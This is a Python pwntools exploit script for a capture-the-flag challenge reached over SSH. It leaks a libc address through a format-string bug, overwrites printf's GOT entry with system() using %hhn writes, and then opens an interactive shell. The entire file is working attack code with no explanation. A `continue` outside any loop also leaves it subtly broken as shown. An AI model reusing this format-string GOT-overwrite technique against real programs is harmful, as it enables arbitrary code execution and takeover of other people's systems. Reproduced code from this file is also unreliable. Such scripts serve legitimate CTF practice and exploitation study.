from pwn import *

#ASLR
#no PIE
#arch=x86-64
#libc=libc6_2.27-3ubuntu1_amd64.so
#codebase=0x400000

#OPT BUFSIZE 511 NO BOF
#REL BUFSIZE 7 NO BOF

#context.log_level='debug'

one_gadgets=[0x4f2c5,0x4f322,0x10a38c]
puts_got=0x404020
printf_got=0x404030
fgets_got=0x404038
fflush_got=0x404040

p=process(['ssh','-i','../x.pem','-p','2229','user@john-cena.ctf.insecurity-insa.fr'])

sla = lambda x,y : p.sendlineafter(x,y)

def leak(off,fmt):
    sla("option ?","%{}${}".format(str(off),fmt))
    p.recvline()
    leak=p.recvline()
    sla('[y/n]','y')
    return leak

def fsbLeak(fmt):
    sla("option ?",fmt)
    leak=p.recvuntil(' ')
    leak=p.recvuntil(' ')
    sla('[y/n]','y')
    return leak

def fsbWrite(fmt):
    sla("option ?",fmt)
    sla('[y/n]','y')

lb=int(leak(85,'p'),16)-0x21b97
success('libc_base : '+ hex(lb))
system=lb+0x4f440
success('system : '+ hex(system))

#bytes [[val,addr]]
bytes=[[0,0]]+[[(system>>(i*8)&0xff),printf_got+i] for i in range(3)]
bytes=sorted(bytes,key=lambda x:x[0])

pay=''
for i in range(1,4):
    pay+='%{}c%{}$hhn'.format(bytes[i][0]-bytes[i-1][0],str(16+i))

success('payload: '+pay)
success('length: '+str(len(pay)))

if '-' in pay:
        p.close()
        continue

pay=pay.ljust(40)
for i in range(1,4):
    pay+=p64(bytes[i][1])

fsbWrite(pay)
p.sendline('/bin/sh')
success("DONE")

p.interactive()
